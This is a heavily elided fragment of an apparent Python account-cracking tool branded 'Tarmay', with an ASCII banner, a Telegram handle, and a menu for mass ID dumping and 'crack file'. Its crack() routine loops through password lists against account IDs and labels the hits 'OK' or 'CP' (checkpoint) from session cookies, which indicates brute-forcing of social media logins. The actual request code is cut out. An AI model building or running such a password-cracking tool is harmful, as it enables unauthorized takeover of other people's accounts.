...
def banner():
  ...
  _____      _       ____     __  __      _      __   __ 
 |_ " _| U  /"\  uU |  _"\ uU|' \/ '|uU  /"\  u  \ \ / / 
   | |    \/ _ \/  \| |_) |/\| |\/| |/ \/ _ \/    \ V /  
  /| |\   / ___ \   |  _ <   | |  | |  / ___ \   U_|"|_u 
 u |_|U  /_/   \_\  |_| \_\  |_|  |_| /_/   \_\    |_|   
 _// \\_  \\    >>  //   \\_<<,-,,-.   \\    >>.-,//|(_  
(__) (__)(__)  (__)(__)  (__)(./  \.) (__)  (__)\_) (__) 

______________________________________________________________     
\033[37m[\033[33m+\033[37m] AUTHOR: Tarmay
\033[37m[\033[33m+\033[37m] TELEGRAM: @tarmay_shaw1
''')
...
#	print('\033[1;32m[02] CRACK FILE \033[1;97m[\033[1;32mON\033[1;97m]')	
	...
	print('\033[1;97m____________________________')
	____TARMAY😎____ = input('\nCHOICE : ')
	if ____TARMAY____ in ['1']:
		dump_massal()
	elif ____TARMAY😎____ in ['2']:
		crack_file()
	elif ____TARMAY😎____ in ['0']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r \033[1;37m[\033[1;32mTarmay😎\033[1;37m] {P}{H}{loop} {P} {H}{ok}/{M}{cp} "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\033[1;37m [🆘 Tarmay-CP ⛔]\033[1;37m  {idf}\033[1;37m |\033[1;37m {pw}')
				...
				print(f'\r\033[1;34m [➳ TARMAY-OK✔ ]\033[1;34m  {idf} \033[1;34m| \033[1;34m{pw}')
	...
	for kes in akun:
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				...
				print('\r%s++++ %s|%s ----> Tarmay       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
